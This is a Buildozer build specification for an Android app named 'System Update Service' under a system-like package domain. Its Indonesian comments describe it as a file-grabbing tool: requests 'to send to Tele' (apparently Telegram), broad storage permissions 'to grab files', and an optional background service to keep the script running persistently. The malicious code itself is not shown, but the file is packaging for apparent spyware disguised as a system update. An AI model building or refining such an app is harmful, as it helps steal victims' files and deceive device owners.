[app]

# (str) Title of your application
title = System Update Service

# (str) Package name
package.name = sysupdate_service

# (str) Package domain (needed for android packaging)
package.domain = org.android.service

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.0.0

# (list) Application requirements
# PENTING: requests buat kirim ke Tele, kivy buat tampilan
requirements = python3,kivy,requests,urllib3,certifi,idna,charset-normalizer

# (str) Supported orientations
orientation = portrait

# (list) Permissions
# PENTING: Izin buat ngerampas file dan akses internet
android.permissions = INTERNET,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,MANAGE_EXTERNAL_STORAGE

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True) or --dir public storage (False)
android.private_storage = True

# (list) List of Java .jar files to add to the libs so that pyobjus can access their classes
#android.add_jars = foo.jar,bar.jar,path/to/baz.jar

# (list) Android service to declare
# Ini biar script lu bisa jalan lebih bandel
#android.services = monitor:service.py

# (str) Log level (0 = error only, 1 = info, 2 = debug)
log_level = 2

# (str) Android entry point default is PythonActivity
android.entrypoint = org.kivy.android.PythonActivity

# (str) Android app theme, default is ok for Kivy
android.apptheme = "@android:style/Theme.NoTitleBar"

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug)
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1